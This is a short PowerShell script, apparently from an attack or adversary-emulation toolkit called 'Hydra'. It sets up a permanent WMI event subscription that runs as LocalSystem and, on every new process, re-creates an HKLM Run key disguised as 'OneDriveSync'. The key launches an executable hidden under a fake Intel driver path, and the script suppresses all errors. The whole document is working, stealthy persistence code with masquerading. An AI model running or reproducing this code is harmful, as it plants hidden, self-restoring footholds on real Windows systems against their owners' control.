# Re-point the Hydra WMI subscription to the reliable trigger and a machine-wide
# re-arm target: CommandLineEventConsumer runs as LocalSystem, so HKCU would be
# SYSTEM's hive, not the logged-in user's - real attackers use HKLM for this.
$ErrorActionPreference = "SilentlyContinue"
Get-WmiObject __EventFilter -Namespace root\subscription -Filter "Name='HydraFilter'" | Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -Filter "Name='HydraConsumer'" | Remove-WmiObject
$f = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{
  Name='HydraFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL';
  Query="SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process'"}
$c = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{
  Name='HydraConsumer';
  CommandLineTemplate='cmd /c reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v OneDriveSync /t REG_SZ /d "C:\Users\Public\Intel\DriverStore\syshealthmon.exe" /f'}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{
  Filter=$f; Consumer=$c} | Out-Null
Write-Host "re-arm re-pointed: any process creation re-creates HKLM Run\OneDriveSync"
